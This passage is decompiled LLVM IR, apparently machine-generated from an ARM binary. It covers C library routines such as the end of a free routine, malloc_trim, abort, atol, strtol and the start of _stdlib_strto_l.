dec_label_pc_1367c:                               ; preds = %dec_label_pc_1362c, %dec_label_pc_13670
  %v0_13708 = phi i32 [ %v1_13638, %dec_label_pc_1362c ], [ %v2_13678, %dec_label_pc_13670 ]
  %v0_1368c = phi i32 [ %v3_13640, %dec_label_pc_1362c ], [ %v0_1368c.pre, %dec_label_pc_13670 ]
  %v1_136a0 = phi i32 [ %v2_13638, %dec_label_pc_1362c ], [ %v0_13688.pre, %dec_label_pc_13670 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13680 = load i32, i32* @r7, align 4
  %v2_13680 = add i32 %v0_13680, 64
  %v3_13680 = inttoptr i32 %v2_13680 to i32*
  %v4_13680 = load i32, i32* %v3_13680, align 4
  store i32 %v4_13680, i32* %r2.global-to-local, align 4
  %v1_13684 = add i32 %v4_13680, 44
  %v2_13684 = inttoptr i32 %v1_13684 to i32*
  %v3_13684 = load i32, i32* %v2_13684, align 4
  store i32 %v3_13684, i32* %r3.global-to-local, align 4
  %v9_13688 = icmp eq i32 %v1_136a0, %v3_13684
  %v1_1368c = and i32 %v0_1368c, -4
  store i32 %v1_1368c, i32* %r0.global-to-local, align 4
  br i1 %v9_13688, label %dec_label_pc_13708, label %dec_label_pc_13694

dec_label_pc_13694:                               ; preds = %dec_label_pc_1367c
  %v2_13694 = add i32 %v1_136a0, %v1_1368c
  store i32 %v2_13694, i32* %r3.global-to-local, align 4
  %v1_13698 = add i32 %v2_13694, 4
  %v2_13698 = inttoptr i32 %v1_13698 to i32*
  %v3_13698 = load i32, i32* %v2_13698, align 4
  store i32 %v3_13698, i32* %r3.global-to-local, align 4
  %v1_1369c = urem i32 %v3_13698, 2
  %v2_1369c = icmp eq i32 %v1_1369c, 0
  %v2_136a0 = add i32 %v1_136a0, 4
  %v3_136a0 = inttoptr i32 %v2_136a0 to i32*
  store i32 %v1_1368c, i32* %v3_136a0, align 4
  br i1 %v2_1369c, label %dec_label_pc_136a8, label %dec_label_pc_13694.dec_label_pc_136d8_crit_edge

dec_label_pc_13694.dec_label_pc_136d8_crit_edge:  ; preds = %dec_label_pc_13694
  %v0_136e8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_136d8

dec_label_pc_136a8:                               ; preds = %dec_label_pc_13694
  %v0_136a8 = load i32, i32* %lr.global-to-local, align 4
  %v1_136a8 = add i32 %v0_136a8, 8
  %v2_136a8 = inttoptr i32 %v1_136a8 to i32*
  %v3_136a8 = load i32, i32* %v2_136a8, align 4
  store i32 %v3_136a8, i32* %r1.global-to-local, align 4
  %v1_136ac = add i32 %v3_136a8, 12
  %v2_136ac = inttoptr i32 %v1_136ac to i32*
  %v3_136ac = load i32, i32* %v2_136ac, align 4
  store i32 %v3_136ac, i32* %r3.global-to-local, align 4
  %v9_136b0 = icmp eq i32 %v3_136ac, %v0_136a8
  %v1_136b4 = add i32 %v0_136a8, 12
  %v2_136b4 = inttoptr i32 %v1_136b4 to i32*
  %v3_136b4 = load i32, i32* %v2_136b4, align 4
  store i32 %v3_136b4, i32* %r2.global-to-local, align 4
  br i1 %v9_136b0, label %dec_label_pc_136bc, label %dec_label_pc_136c8

dec_label_pc_136bc:                               ; preds = %dec_label_pc_136a8
  %v1_136bc = add i32 %v3_136b4, 8
  %v2_136bc = inttoptr i32 %v1_136bc to i32*
  %v3_136bc = load i32, i32* %v2_136bc, align 4
  store i32 %v3_136bc, i32* %r3.global-to-local, align 4
  %v9_136c0 = icmp eq i32 %v3_136bc, %v0_136a8
  br i1 %v9_136c0, label %dec_label_pc_136cc, label %dec_label_pc_136c8

dec_label_pc_136c8:                               ; preds = %dec_label_pc_136a8, %dec_label_pc_13664, %dec_label_pc_13648, %dec_label_pc_136bc
  %v0_136c8 = call i32 @abort()
  store i32 %v0_136c8, i32* %r0.global-to-local, align 4
  %v0_136cc.pre = load i32, i32* @r1, align 4
  %v1_136cc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_136cc

dec_label_pc_136cc:                               ; preds = %dec_label_pc_136bc, %dec_label_pc_136c8
  %v1_136cc = phi i32 [ %v3_136b4, %dec_label_pc_136bc ], [ %v1_136cc.pre, %dec_label_pc_136c8 ]
  %v0_136cc = phi i32 [ %v3_136a8, %dec_label_pc_136bc ], [ %v0_136cc.pre, %dec_label_pc_136c8 ]
  %v2_136cc = add i32 %v1_136cc, 8
  %v3_136cc = inttoptr i32 %v2_136cc to i32*
  store i32 %v0_136cc, i32* %v3_136cc, align 4
  %v0_136d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_136d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_136d0 = add i32 %v1_136d0, 12
  %v3_136d0 = inttoptr i32 %v2_136d0 to i32*
  store i32 %v0_136d0, i32* %v3_136d0, align 4
  %v0_136d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_136d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_136d4 = add i32 %v1_136d4, %v0_136d4
  store i32 %v2_136d4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_136d8

dec_label_pc_136d8:                               ; preds = %dec_label_pc_13694.dec_label_pc_136d8_crit_edge, %dec_label_pc_136cc
  %v0_136e8 = phi i32 [ %v0_136e8.pre, %dec_label_pc_13694.dec_label_pc_136d8_crit_edge ], [ %v2_136d4, %dec_label_pc_136cc ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_136dc = load i32, i32* @r7, align 4
  %v2_136dc = add i32 %v0_136dc, 64
  %v3_136dc = inttoptr i32 %v2_136dc to i32*
  %v4_136dc = load i32, i32* %v3_136dc, align 4
  %v1_136e0 = add i32 %v4_136dc, 52
  store i32 %v1_136e0, i32* %r3.global-to-local, align 4
  %v1_136e4 = add i32 %v4_136dc, 60
  %v2_136e4 = inttoptr i32 %v1_136e4 to i32*
  %v3_136e4 = load i32, i32* %v2_136e4, align 4
  store i32 %v3_136e4, i32* %r1.global-to-local, align 4
  %v1_136e8 = or i32 %v0_136e8, 1
  store i32 %v1_136e8, i32* %r2.global-to-local, align 4
  %v1_136ec = load i32, i32* %r4.global-to-local, align 4
  %v2_136ec = add i32 %v1_136ec, 12
  %v3_136ec = inttoptr i32 %v2_136ec to i32*
  store i32 %v1_136e0, i32* %v3_136ec, align 4
  %v0_136f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_136f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_136f0 = add i32 %v1_136f0, 8
  %v3_136f0 = inttoptr i32 %v2_136f0 to i32*
  store i32 %v0_136f0, i32* %v3_136f0, align 4
  %v0_136f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_136f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_136f4 = add i32 %v1_136f4, 4
  %v3_136f4 = inttoptr i32 %v2_136f4 to i32*
  store i32 %v0_136f4, i32* %v3_136f4, align 4
  %v0_136f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_136f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_136f8 = add i32 %v1_136f8, %v0_136f8
  %v4_136f8 = inttoptr i32 %v3_136f8 to i32*
  store i32 %v0_136f8, i32* %v4_136f8, align 4
  %v0_136fc = load i32, i32* %r4.global-to-local, align 4
  %v1_136fc = load i32, i32* %r1.global-to-local, align 4
  %v2_136fc = add i32 %v1_136fc, 12
  %v3_136fc = inttoptr i32 %v2_136fc to i32*
  store i32 %v0_136fc, i32* %v3_136fc, align 4
  %v0_13700 = load i32, i32* %r4.global-to-local, align 4
  %v1_13700 = load i32, i32* %r3.global-to-local, align 4
  %v2_13700 = add i32 %v1_13700, 8
  %v3_13700 = inttoptr i32 %v2_13700 to i32*
  store i32 %v0_13700, i32* %v3_13700, align 4
  br label %dec_label_pc_13718

dec_label_pc_13708:                               ; preds = %dec_label_pc_1367c
  %v2_13708 = add i32 %v1_1368c, %v0_13708
  store i32 %v2_13708, i32* %ip.global-to-local, align 4
  %v1_1370c = or i32 %v2_13708, 1
  store i32 %v1_1370c, i32* %r3.global-to-local, align 4
  %v0_13710 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13710, i32* %v2_13684, align 4
  %v0_13714 = load i32, i32* %r3.global-to-local, align 4
  %v1_13714 = load i32, i32* %r4.global-to-local, align 4
  %v2_13714 = add i32 %v1_13714, 4
  %v3_13714 = inttoptr i32 %v2_13714 to i32*
  store i32 %v0_13714, i32* %v3_13714, align 4
  br label %dec_label_pc_13718

dec_label_pc_13718:                               ; preds = %dec_label_pc_136d8, %dec_label_pc_13708
  %v0_13718 = load i32, i32* %ip.global-to-local, align 4
  %v3_1371c = icmp ult i32 %v0_13718, 131070
  br i1 %v3_1371c, label %dec_label_pc_13788, label %dec_label_pc_13720

dec_label_pc_13720:                               ; preds = %dec_label_pc_13718
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13724 = load i32, i32* @r7, align 4
  %v2_13724 = add i32 %v0_13724, 64
  %v3_13724 = inttoptr i32 %v2_13724 to i32*
  %v4_13724 = load i32, i32* %v3_13724, align 4
  store i32 %v4_13724, i32* @r4, align 4
  %v1_13728 = inttoptr i32 %v4_13724 to i32*
  %v2_13728 = load i32, i32* %v1_13728, align 4
  store i32 %v2_13728, i32* %r3.global-to-local, align 4
  %v1_1372c = and i32 %v2_13728, 2
  %v2_1372c = icmp eq i32 %v1_1372c, 0
  br i1 %v2_1372c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_13720
  store i32 %v4_13724, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_13720, %bb
  %v1_13734 = xor i1 %v2_1372c, true
  call void @__pseudo_cond_branch(i1 %v1_13734, i32 ptrtoint (i32* @global_var_133d8.479 to i32))
  %v0_13738 = load i32, i32* @r4, align 4
  %v1_13738 = add i32 %v0_13738, 44
  %v2_13738 = inttoptr i32 %v1_13738 to i32*
  %v3_13738 = load i32, i32* %v2_13738, align 4
  store i32 %v3_13738, i32* %r3.global-to-local, align 4
  %v1_1373c = add i32 %v3_13738, 4
  %v2_1373c = inttoptr i32 %v1_1373c to i32*
  %v3_1373c = load i32, i32* %v2_1373c, align 4
  store i32 %v3_1373c, i32* %r3.global-to-local, align 4
  %v1_13740 = add i32 %v0_13738, 836
  %v2_13740 = inttoptr i32 %v1_13740 to i32*
  %v3_13740 = load i32, i32* %v2_13740, align 4
  store i32 %v3_13740, i32* %r2.global-to-local, align 4
  %v1_13744 = and i32 %v3_1373c, -4
  store i32 %v1_13744, i32* %r3.global-to-local, align 4
  %v3_13748 = icmp ult i32 %v1_13744, %v3_13740
  br i1 %v3_13748, label %dec_label_pc_13788, label %dec_label_pc_13750

dec_label_pc_13750:                               ; preds = %bb16
  store i32 %v0_13738, i32* %r1.global-to-local, align 4
  %v1_13754 = add i32 %v0_13738, 840
  %v2_13754 = inttoptr i32 %v1_13754 to i32*
  %v3_13754 = load i32, i32* %v2_13754, align 4
  store i32 %v3_13754, i32* %r0.global-to-local, align 4
  %v2_13758 = call i32 @__malloc_trim(i32 %v3_13754, i32 %v0_13738)
  store i32 %v2_13758, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13788

dec_label_pc_13760:                               ; preds = %dec_label_pc_13624
  %v2_13760 = inttoptr i32 %v1_135f4 to i32*
  %v3_13760 = load i32, i32* %v2_13760, align 4
  store i32 %v3_13760, i32* %r0.global-to-local, align 4
  %v1_13764 = add i32 %v4_135e4, 848
  %v2_13764 = inttoptr i32 %v1_13764 to i32*
  %v3_13764 = load i32, i32* %v2_13764, align 4
  store i32 %v3_13764, i32* %r2.global-to-local, align 4
  %v1_13768 = add i32 %v4_135e4, 868
  %v2_13768 = inttoptr i32 %v1_13768 to i32*
  %v3_13768 = load i32, i32* %v2_13768, align 4
  %v2_1376c = add i32 %v3_13760, %v1_135f0
  store i32 %v2_1376c, i32* %r1.global-to-local, align 4
  %v1_13770 = add i32 %v3_13764, -1
  store i32 %v1_13770, i32* %r2.global-to-local, align 4
  %v2_13774 = sub i32 %v3_13768, %v2_1376c
  store i32 %v2_13774, i32* %r3.global-to-local, align 4
  store i32 %v2_13774, i32* %v2_13768, align 4
  %v1_1377c = load i32, i32* @lr, align 4
  %v2_1377c = add i32 %v1_1377c, 848
  %v3_1377c = inttoptr i32 %v2_1377c to i32*
  store i32 %v1_13770, i32* %v3_1377c, align 4
  %v0_13780 = load i32, i32* %r0.global-to-local, align 4
  %v1_13780 = load i32, i32* @r5, align 4
  %v2_13780 = sub i32 %v1_13780, %v0_13780
  store i32 %v2_13780, i32* %r0.global-to-local, align 4
  %v4_13784 = call i32 @munmap(i32 %v2_13780, i32 %v2_1376c, i32 %v1_13770, i32 %v2_13774)
  store i32 %v4_13784, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13788

dec_label_pc_13788:                               ; preds = %bb16, %dec_label_pc_13718, %dec_label_pc_13750, %dec_label_pc_13604, %dec_label_pc_13760
  store i32 %v2_13598, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_13794 = load i32, i32* @r7, align 4
  %v2_13794 = add i32 %v0_13794, 44
  %v3_13794 = inttoptr i32 %v2_13794 to i32*
  %v4_13794 = load i32, i32* %v3_13794, align 4
  store i32 %v4_13794, i32* %ip.global-to-local, align 4
  store i32 79776, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13794)
  br label %dec_label_pc_137a0

dec_label_pc_137a0:                               ; preds = %entry, %dec_label_pc_13788
  store i32 %v3_1358c, i32* @r4, align 4
  store i32 %v6_1358c, i32* @r5, align 4
  store i32 %v9_1358c, i32* @r6, align 4
  store i32 %v12_1358c, i32* @r7, align 4
  store i32 %v18_1358c, i32* @lr, align 4
  ret i32 %v2_13598

; uselistorder directives
  uselistorder i32 %v0_13738, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_136f8, { 1, 0 }
  uselistorder i32 %v1_13638, { 1, 0 }
  uselistorder i32 %v0_13638, { 1, 0 }
  uselistorder i32 %v3_1360c, { 1, 0 }
  uselistorder i32 %v1_135f0, { 1, 0, 2 }
  uselistorder i32 %v2_135ec, { 1, 2, 0, 3 }
  uselistorder i32 %v4_135e4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13594, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_137a0, { 1, 0 }
  uselistorder label %dec_label_pc_13788, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_13718, { 1, 0 }
  uselistorder label %dec_label_pc_136d8, { 1, 0 }
  uselistorder label %dec_label_pc_136cc, { 1, 0 }
  uselistorder label %dec_label_pc_136c8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1367c, { 1, 0 }
}

define i32 @function_137b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_137b0:
  %v0_137b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_137b0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_137b0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_137b0, %bb
  %v4_137c4 = phi i32 [ %arg1, %dec_label_pc_137b0 ], [ 0, %bb ]
  ret i32 %v4_137c4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_137c8 = load i32, i32* @r4, align 4
  store i32 %v3_137c8, i32* %stack_var_-12, align 4
  %v6_137c8 = load i32, i32* @r5, align 4
  %v4_137d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_137d8, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_137d8, i32* @r0, align 4
  %v0_137e8 = call i32 @__malloc_consolidate()
  %v0_137ec = load i32, i32* @r4, align 4
  %v0_137f0 = load i32, i32* @r5, align 4
  %v2_137f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_137f8, i32* @r4, align 4
  store i32 %v6_137c8, i32* @r5, align 4
  %v2_137fc = call i32 @__malloc_trim(i32 %v0_137ec, i32 %v0_137f0)
  %v0_13800 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13800, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_13804 = phi i32 [ %v2_137fc, %entry ], [ 0, %bb ]
  ret i32 %v4_13804

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r5, align 4
  %v4_13820 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 16) to i32*), align 4
  store i32 79916, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13820)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_13848 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_13850 = load i32, i32* @r5, align 4
  %v2_13850 = add i32 %v0_13850, 632
  %v3_13850 = inttoptr i32 %v2_13850 to i32*
  %v4_13850 = load i32, i32* %v3_13850, align 4
  %v2_13854 = icmp eq i32 %v4_13850, 0
  br i1 %v2_13854, label %dec_label_pc_1385c, label %dec_label_pc_1389c

dec_label_pc_1385c:                               ; preds = %entry
  store i32 1, i32* %v3_13850, align 4
  br label %dec_label_pc_13864

dec_label_pc_13864:                               ; preds = %dec_label_pc_138ac, %dec_label_pc_1385c
  %v0_13868 = load i32, i32* @r5, align 4
  %v2_13868 = add i32 %v0_13868, 212
  store i32 %v2_13868, i32* @r4, align 4
  %v2_13874 = add i32 %v0_13868, 68
  %v3_13874 = inttoptr i32 %v2_13874 to i32*
  %v4_13874 = load i32, i32* %v3_13874, align 4
  call void @__pseudo_branch(i32 %v4_13874)
  %v1_13884 = call i32 @__GI_raise(i32 6)
  %v0_13890 = load i32, i32* @r5, align 4
  %v2_13890 = add i32 %v0_13890, 16
  %v3_13890 = inttoptr i32 %v2_13890 to i32*
  %v4_13890 = load i32, i32* %v3_13890, align 4
  store i32 80028, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13890)
  %v0_138a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1389c

dec_label_pc_1389c:                               ; preds = %entry, %dec_label_pc_13864
  %v1_138b4 = phi i32 [ %v0_13850, %entry ], [ %v0_138a0.pre, %dec_label_pc_13864 ]
  %v2_138a0 = add i32 %v1_138b4, 632
  %v3_138a0 = inttoptr i32 %v2_138a0 to i32*
  %v4_138a0 = load i32, i32* %v3_138a0, align 4
  %v7_138a4 = icmp eq i32 %v4_138a0, 1
  br i1 %v7_138a4, label %dec_label_pc_138ac, label %dec_label_pc_138e8

dec_label_pc_138ac:                               ; preds = %dec_label_pc_1389c
  %v2_138ac = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_138ac, i32* @r4, align 4
  store i32 2, i32* %v3_138a0, align 4
  %v3_138c4 = bitcast i32* %stack_var_-28 to i8*
  %v4_138c4 = call i32 @__GI_memset(i8* %v3_138c4, i32 0, i32 20)
  %v3_138e0 = call i32 @__libc_sigaction(i32 6, i32 %v2_138ac, i32 0)
  br label %dec_label_pc_13864

dec_label_pc_138e8:                               ; preds = %dec_label_pc_1389c
  %v7_138e8 = icmp eq i32 %v4_138a0, 2
  br i1 %v7_138e8, label %dec_label_pc_138f0, label %dec_label_pc_138fc

dec_label_pc_138f0:                               ; preds = %dec_label_pc_138e8
  store i32 3, i32* %v3_138a0, align 4
  %v0_138f8 = call i32 @abort()
  %v0_138fc.pre = load i32, i32* @r5, align 4
  %v1_138fc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_138fc

dec_label_pc_138fc:                               ; preds = %dec_label_pc_138e8, %dec_label_pc_138f0
  %v3_13908 = phi i32 [ 632, %dec_label_pc_138e8 ], [ %v1_138fc.pre, %dec_label_pc_138f0 ]
  %v2_13908 = phi i32 [ %v1_138b4, %dec_label_pc_138e8 ], [ %v0_138fc.pre, %dec_label_pc_138f0 ]
  %v2_138fc = add i32 %v2_13908, %v3_13908
  %v3_138fc = inttoptr i32 %v2_138fc to i32*
  %v4_138fc = load i32, i32* %v3_138fc, align 4
  %v7_13900 = icmp eq i32 %v4_138fc, 3
  br i1 %v7_13900, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_138fc
  store i32 4, i32* %v3_138fc, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_138fc, %bb
  call void @__pseudo_cond_branch(i1 %v7_13900, i32 ptrtoint (i32* @global_var_154e0.488 to i32))
  br label %dec_label_pc_13914

dec_label_pc_13914:                               ; preds = %dec_label_pc_13914, %.thread2
  %v0_13914 = call i32 @abort()
  br label %dec_label_pc_13914

; uselistorder directives
  uselistorder i32* %v3_138a0, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_138fc, { 1, 0 }
  uselistorder label %dec_label_pc_1389c, { 1, 0 }
}

define i32 @function_13920(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13920:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13920 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13920, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13920
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13920, %bb
  %v4_1392c = phi i32 [ %tmp, %dec_label_pc_13920 ], [ 0, %bb ]
  ret i32 %v4_1392c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_13940 = call i32 @strtol()
  ret i32 %v0_13940
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1395c = call i32 @_stdlib_strto_l()
  ret i32 %v0_1395c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %ip.global-to-local, align 4
  %v0_13980 = load i32, i32* @r1, align 4
  store i32 %v0_13980, i32* %sb.global-to-local, align 4
  %v0_13984 = load i32, i32* @r2, align 4
  store i32 %v0_13984, i32* %r5.global-to-local, align 4
  %v0_13988 = load i32, i32* @r0, align 4
  store i32 %v0_13988, i32* %r4.global-to-local, align 4
  %v0_1398c = load i32, i32* @r3, align 4
  br label %dec_label_pc_13998

dec_label_pc_13994:                               ; preds = %dec_label_pc_13998
  %v1_13994 = add i32 %v0_139d0, 1
  store i32 %v1_13994, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13998

dec_label_pc_13998:                               ; preds = %entry, %dec_label_pc_13994
  %v0_139d0 = phi i32 [ %v0_13988, %entry ], [ %v1_13994, %dec_label_pc_13994 ]
  %v1_13998 = inttoptr i32 %v0_139d0 to i8*
  %v2_13998 = load i8, i8* %v1_13998, align 1
  %v3_13998 = zext i8 %v2_13998 to i32
  store i32 %v3_13998, i32* %r1.global-to-local, align 4
  %v4_1399c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 276) to i32*), align 4
  %v2_139a0 = mul nuw nsw i32 %v3_13998, 2
  %v2_139a4 = add i32 %v2_139a0, %v4_1399c
  %v3_139a4 = inttoptr i32 %v2_139a4 to i16*
  %v4_139a4 = load i16, i16* %v3_139a4, align 2
  %v1_139a8 = and i16 %v4_139a4, 32
  %v2_139a8 = icmp eq i16 %v1_139a8, 0
  br i1 %v2_139a8, label %dec_label_pc_139b0, label %dec_label_pc_13994

dec_label_pc_139b0:                               ; preds = %dec_label_pc_13998
  %v7_139b0 = icmp eq i8 %v2_13998, 43
  br i1 %v7_139b0, label %dec_label_pc_139d0, label %dec_label_pc_139b8

dec_label_pc_139b8:                               ; preds = %dec_label_pc_139b0
  %v7_139b8 = icmp eq i8 %v2_13998, 45
  br i1 %v7_139b8, label %dec_label_pc_139d0, label %bb

bb:                                               ; preds = %dec_label_pc_139b8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_139d4

dec_label_pc_139d0:                               ; preds = %dec_label_pc_139b0, %dec_label_pc_139b8
  %storemerge47 = phi i32 [ 1, %dec_label_pc_139b8 ], [ 0, %dec_label_pc_139b0 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_139d0 = add i32 %v0_139d0, 1
  store i32 %v1_139d0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_139d4

dec_label_pc_139d4:                               ; preds = %bb, %dec_label_pc_139d0
  %v0_139f4 = phi i32 [ %v0_139d0, %bb ], [ %v1_139d0, %dec_label_pc_139d0 ]
  %v1_139d4 = and i32 %v0_13984, -17
  %v3_139d4 = icmp eq i32 %v1_139d4, 0
  br i1 %v3_139d4, label %dec_label_pc_139e0, label %bb60

bb60:                                             ; preds = %dec_label_pc_139d4
  br label %bb64

dec_label_pc_139e0:                               ; preds = %dec_label_pc_139d4
  %v1_139e0 = inttoptr i32 %v0_139f4 to i8*
  %v2_139e0 = load i8, i8* %v1_139e0, align 1
  %v7_139e4 = icmp eq i8 %v2_139e0, 48
  %v1_139e8 = add i32 %v0_13984, 10
  store i32 %v1_139e8, i32* %r5.global-to-local, align 4
  br i1 %v7_139e4, label %dec_label_pc_139f4, label %bb61

bb61:                                             ; preds = %dec_label_pc_139e0
  br label %.thread8

dec_label_pc_139f4:                               ; preds = %dec_label_pc_139e0
  %v1_139f4 = add i32 %v0_139f4, 1
  %v2_139f4 = inttoptr i32 %v1_139f4 to i8*
  %v3_139f4 = load i8, i8* %v2_139f4, align 1
  %v4_139f4 = zext i8 %v3_139f4 to i32
  store i32 %v1_139f4, i32* %r4.global-to-local, align 4
  %v1_139f8 = or i32 %v4_139f4, 32
  %v7_139fc = icmp eq i32 %v1_139f8, 120
  %v1_13a00 = add i32 %v0_13984, 8
  store i32 %v1_13a00, i32* %r5.global-to-local, align 4
  br i1 %v7_139fc, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_139f4
  %v3_13a0c = mul i32 %v1_13a00, 2
  store i32 %v3_13a0c, i32* %r5.global-to-local, align 4
  %v2_13a10 = add i32 %v0_139f4, 2
  store i32 %v2_13a10, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_139f4, %bb61, %bb62
  %v1_13ae430 = phi i32 [ %v0_13988, %bb61 ], [ %v1_139f4, %bb62 ], [ %v1_139f4, %dec_label_pc_139f4 ]
  %v0_13a6021 = phi i32 [ %v0_139f4, %bb61 ], [ %v2_13a10, %bb62 ], [ %v1_139f4, %dec_label_pc_139f4 ]
  %v0_13a14 = phi i32 [ %v1_139e8, %bb61 ], [ %v3_13a0c, %bb62 ], [ %v1_13a00, %dec_label_pc_139f4 ]
  %v5_13a18 = icmp slt i32 %v0_13a14, 16
  br i1 %v5_13a18, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_13ae429 = phi i32 [ %v0_13988, %bb60 ], [ %v1_13ae430, %.thread8 ], [ %v1_13ae430, %bb63 ]
  %v0_13a6020 = phi i32 [ %v0_139f4, %bb60 ], [ %v0_13a6021, %.thread8 ], [ %v0_13a6021, %bb63 ]
  %v0_13a40 = phi i32 [ %v0_13984, %bb60 ], [ %v0_13a14, %.thread8 ], [ 16, %bb63 ]
  %v1_13a1c = add i32 %v0_13a40, -2
  %tmp = icmp ugt i32 %v1_13a1c, 34
